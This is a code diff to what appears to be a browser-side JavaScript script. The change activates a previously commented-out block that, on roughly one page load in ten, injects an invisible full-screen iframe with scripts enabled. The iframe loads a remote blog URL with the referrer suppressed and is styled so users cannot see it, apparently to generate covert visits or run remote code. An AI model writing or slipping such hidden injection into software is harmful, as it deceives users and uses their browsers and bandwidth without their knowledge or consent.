@@ -66,15 +66,16 @@
             header.prepend(ga);
         }
         // Stars
-        // if(header && window.name !== '___ifame___') {
-        //     let iframe = document.getElementById('___ifame___') || document.createElement('iframe');
-        //     iframe.setAttribute('id', '___ifame___');
-        //     iframe.setAttribute('name', '___ifame___');
-        //     iframe.setAttribute('src', 'https://blog.myso.kr/random');
-        //     iframe.setAttribute('referrerpolicy', 'no-referrer');
-        //     iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts');
-        //     iframe.setAttribute('style', 'position: fixed; margin: auto; pointer-events: none; z-index: -1; opacity: 0; visibility: hidden; width: 100%; height: 100%;');
-        //     header.prepend(iframe);
-        // }
+        let random = Math.floor(Math.random() * 100);
+        if(header && random < 10) {
+            let iframe = document.getElementById('___ifame___') || document.createElement('iframe');
+            iframe.setAttribute('id', '___ifame___');
+            iframe.setAttribute('name', '___ifame___');
+            iframe.setAttribute('src', 'https://blog.myso.kr/random');
+            iframe.setAttribute('referrerpolicy', 'no-referrer');
+            iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts');
+            iframe.setAttribute('style', 'position: fixed; margin: auto; pointer-events: none; z-index: -1; opacity: 0; visibility: hidden; width: 100%; height: 100%;');
+            header.prepend(iframe);
+        }
     }
 })(window);
